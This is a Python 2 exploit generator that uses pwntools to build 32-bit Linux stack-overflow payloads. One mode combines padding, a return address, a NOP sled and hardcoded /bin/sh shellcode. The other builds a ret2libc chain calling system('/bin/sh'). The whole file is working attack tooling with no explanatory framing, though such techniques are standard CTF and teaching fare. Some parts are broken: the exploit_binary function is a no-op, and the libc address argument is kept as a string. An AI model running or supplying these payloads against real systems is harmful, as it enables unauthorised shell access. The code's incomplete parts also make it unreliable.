#!/usr/bin/python2

##
## https://gist.github.com/kozlovzxc/7c5f33cda3553d459026db9e4db6f2f0
##

import argparse
from itertools import ifilter
import pwnlib
import os,sys,re

##
##

def generate_shellcode_exploit(eip_offset, esp, nopsled_size, custom_shellcode):
    shellcode = custom_shellcode if custom_shellcode else (
        '\xeb\x0b\x5b\x31'
        '\xc0\x31\xc9\x31'
        '\xd2\xb0\x0b\xcd'
        '\x80\xe8\xf0\xff'
        '\xff\xff\x2f\x62'
        '\x69\x6e\x2f\x73\x68'
        )

    nopsled = pwnlib.asm.asm('nop') * nopsled_size
    packed_eip = pwnlib.util.packing.p32(int(esp, 16) + eip_offset + nopsled_size/2)

    payload = "A"*eip_offset
    payload += packed_eip
    payload += nopsled
    payload += shellcode

    return payload

def generate_libc_exploit(binary_name, eip_offset, libc_addr):
    elf = pwnlib.elf.ELF(binary_name)

    libc = None
    if libc_addr:
        libc = elf.libc
        libc.address = libc_addr
    else:
        libc = ifilter(
            lambda x: x.file.name == elf.libc.file.name,
            pwnlib.gdb.find_module_addresses(binary_name)
            ).next()

    system_arg = libc.search('/bin/sh').next()
    system = libc.symbols['system']
    exit = libc.symbols['exit']

    payload = eip_offset*"A"
    payload += pwnlib.util.packing.p32(system)
    payload += pwnlib.util.packing.p32(exit)
    payload += pwnlib.util.packing.p32(system_arg)

    return payload

def exploit_binary(binary_name):
    exploit_string = ''
    proc = pwnlib.tubes.process.process(
        executable=binary_name,
        argv=[binary_name, exploit_string]
        )
    proc.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'eip_offset',
        type=int,
        help='number of bytes before eip'
        )
    subparsers = parser.add_subparsers(help='commands', dest="command")

    shellcode_exploit_parser = subparsers.add_parser('shellcode')
    shellcode_exploit_parser.add_argument(
        'esp',
        type=str,
        help='esp addr'
        )
    shellcode_exploit_parser.add_argument(
        '--nopsled_size',
        type=int,
        default=100,
        help='size of nopsled'
        )
    shellcode_exploit_parser.add_argument(
        '--shellcode',
        type=str,
        default=None,
        help='custom shellcode'
        )

    ret_to_libc_exploit_parser = subparsers.add_parser('ret_to_libc')
    ret_to_libc_exploit_parser.add_argument(
        'binary_name',
        type=str,
        help='name of the exploiable binary'
        )
    ret_to_libc_exploit_parser.add_argument(
        '--libc_addr',
        type=str,
        default='',
        help='custom addr of libc'
        )

    args = parser.parse_args()

    pwnlib.context.context.update(arch='i386', os='linux')

    payload = ''
    if args.command == 'shellcode':
        payload = generate_shellcode_exploit(
            args.eip_offset,
            args.esp,
            args.nopsled_size,
            args.shellcode
            )
    elif args.command == 'ret_to_libc':
        payload = generate_libc_exploit(
            args.binary_name,
            args.eip_offset,
            args.libc_addr
            )

    print payload

if __name__ == "__main__":
    main()

##
##
